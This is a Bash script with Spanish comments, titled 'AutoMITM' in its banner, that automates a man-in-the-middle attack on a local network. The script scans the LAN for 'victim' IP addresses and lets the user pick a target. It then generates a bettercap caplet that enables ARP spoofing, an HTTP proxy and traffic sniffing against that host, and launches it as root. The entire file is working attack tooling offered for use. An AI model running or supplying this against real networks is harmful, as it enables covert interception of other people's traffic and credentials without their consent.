#!/bin/bash

# Autor: @ju4ncaa (Juan Carlos Rodríguez)

# Paleta de colores ANSI
GREEN="\e[1;92m"
RED="\e[1;91m"
YELLOW="\e[1;93m"
CYAN="\e[1;96m"
PURPLE="\e[1;35m"
RESET="\e[1;97m"

# FUNCIONES

# Exit
trap ctrl_c INT
stty -ctlecho
function ctrl_c() {
    echo -e "\n\n${RED}[!]${RESET} Saliendo..."; 
    tput cnorm; stty echo; exit 1
}

# Panel de ayuda
function help_panel() {
    echo -e "\n${YELLOW}[+]${RESET} Uso: $0"
}

if [[ "$1" == "-h" || "$1" == "--help" ]]; then
    help_panel; exit 0
fi

# Banner
function banner() {
    tput civis; stty -echo
    echo -e "${PURPLE}  ___        _       ___  ________ ________  ___${RESET}"
    echo -e "${PURPLE} / _ \      | |      |  \/  |_   _|_   _|  \/  |${RESET}"
    echo -e "${PURPLE}/ /_\ \_   _| |_ ___ | .  . | | |   | | | .  . |${YELLOW} Autor: @ju4ncaa (Juan Carlos Rodríguez)${PURPLE}"
    echo -e "${PURPLE}|  _  | | | | __/ _ \| |\/| | | |   | | | |\/| |${RESET}"
    echo -e "${PURPLE}| | | | |_| | || (_) | |  | |_| |_  | | | |  | |${RESET}"
    echo -e "${PURPLE}\_| |_/\____|\__\___/\_|  |_/\___/  \_/ \_|  |_/${RESET}\n"
    sleep 2; tput cnorm; stty echo                            
}

# Comprobar herramientas
function check_tools() {
    tput civis; stty -echo
    tools=("bettercap, arp-scan")
    echo -e "\n${CYAN}[+]${RESET} Comprobando herramientas necesarias..."; sleep 0.5
    counter=0
    for tool in "${tools[@]}"; do
    ((counter++))
        if command -v $tool &>/dev/null; then
            echo -e "\n${YELLOW}${counter}.${RESET}${tool}....${GREEN}OK${RESET}"
        else
            echo -e "\n${YELLOW}${counter}.${RESET}${tool}....${RED}NO${RESET}"
            echo -e "\n${RED}[!]${RESET} La herramienta ${YELLOW}$tool${RESET} no está instalada en el sistema, debes instalarla para continuar."
            tput cnorm; stty echo; exit 1
        fi
        sleep 0.5
    done
    tput cnorm; stty echo
}
# Seleccionar interfaz de trabajo
function select_interface() {
    interfaces=$(ip addr show | awk -F: '/^[0-9]+: / {print $2;}')
    counter=0
    tput civis; stty -echo
    echo -e "\n${CYAN}[+]${RESET} Listando interfaces de red disponibles..."; sleep 1
    for interface in $interfaces; do
        ((counter++))
        echo -e "\n${YELLOW}${counter}.${RESET}${interface}"
        sleep 0.5
    done; tput cnorm; stty echo
    echo -n -e "\n${CYAN}Seleccione la interfaz con la que desea trabajar >${RESET} "; read interface
    interface=$(echo $interface | tr '[:upper:]' '[:lower:]')
    if ! ip addr show ${interface} &>/dev/null; then 
        echo -e "\n${RED}[!]${RESET} La interaz de red ${YELLOW}${interface}${RESET} no existe"; exit 1
    else
        echo -e "\n${YELLOW}[+]${RESET} Interfaz de trabajo seleccionada: ${YELLOW}$interface${RESET}"
    fi
}

# Detectar puerta de enlace predeterminada
function detect_gateway() {
    tput civis
    echo -e "\n${CYAN}[+]${RESET} Detectando puerta de enlace prederterminada..."; sleep 1
    gateway=$(ip route | grep default | awk '{print $3}')
    echo -e "\n${YELLOW}[+]${RESET} Puerta de enlace predeterminada: ${YELLOW}$gateway${RESET}"
}

# Establecer objetivo de ataque
function set_target() {
    stty -echo
    echo -e "\n${CYAN}[+]${RESET} Listando direcciones IP victimas disponibles..."
    targets=$(sudo arp-scan -I eth0 --localnet | awk -F ' ' '{print $1}' | grep -oP '([0-9]{1,3}\.){3}[0-9]{1,3}')
    counter=0
    for target in $targets; do
        ((counter++))
        echo -e "\n${YELLOW}$counter-${RESET} $target"
        sleep 0.5
    done
    tput cnorm
    stty echo
    echo -n -e "\n${CYAN}Seleccione la dirección IP que deseas atacar >${RESET} "; read target_ip
    if ! echo $targets | grep "$target_ip" &>/dev/null ; then
        echo -e "\n${RED}[!]${RESET} La dirección IP ${YELLOW}$target_ip${RESET} no se encuentra en la lista de objetivos"; exit 1
    else
        echo -e "\n${YELLOW}[+]${RESET} Dirección IP objetivo seleccionada: ${YELLOW}$target_ip${RESET}"
    fi
}

# Ataque MITM con bettercap
function mitm_attack() {
    caplet_file="mitm.cap"
    echo -e "\n${CYAN}[+]${RESET} Creando caplet para la automatización del ataque MITM con bettercap..."
    echo "# Autor: @ju4ncaa (Juan Carlos Rodríguez)" > $caplet_file
    echo "" >> $caplet_file
    echo "set net.interface $interface" >> $caplet_file
    echo "set arp.spoof.targets $target_ip" >> $caplet_file
    echo "arp.spoof on" >> $caplet_file
    echo "http.proxy on" >> $caplet_file
    echo "net.sniff on" >> $caplet_file
    sleep 2; echo -e "\n${YELLOW}#${RESET} Caplet generado automaticamente en ${YELLOW}$(pwd)/$caplet_file${RESET}"; sleep 2; clear
    banner
    echo -e "\n${CYAN}RESUMEN DEL ATAQUE:${RESET}\n"
    echo -e "\t${PURPLE}1)${RESET}Dirección IP objetivo: ${YELLOW}$target_ip${RESET}"
    echo -e "\t${PURPLE}2)${RESET}Puerta de enlace predeterminada: ${YELLOW}$gateway${RESET}"
    echo -e "\t${PURPLE}3)${RESET}Interfaz de red seleccionada: ${YELLOW}$interface${RESET}"
    echo -e "\t${PURPLE}4)${RESET}Ubicación del caplet: ${YELLOW}$(pwd)/$caplet_file${RESET}"
    echo -e "\n${CYAN}[+]${RESET} Iniciando ataque MITM con ${YELLOW}bettercap${RESET} hacia la victima ${YELLOW}$target_ip${RESET}\n"; sleep 2
    sudo bettercap -caplet mitm.cap
}

# Programa principal
if [ "$(id -u)" == "0" ]; then
    banner
    check_tools
    select_interface
    detect_gateway
    set_target
    mitm_attack
else
    echo -e "\n${RED}[!]${RESET} Se requieren permisos de superusuario ${RED}(root)${RESET} para ejecutar el script"
    exit 1
fi
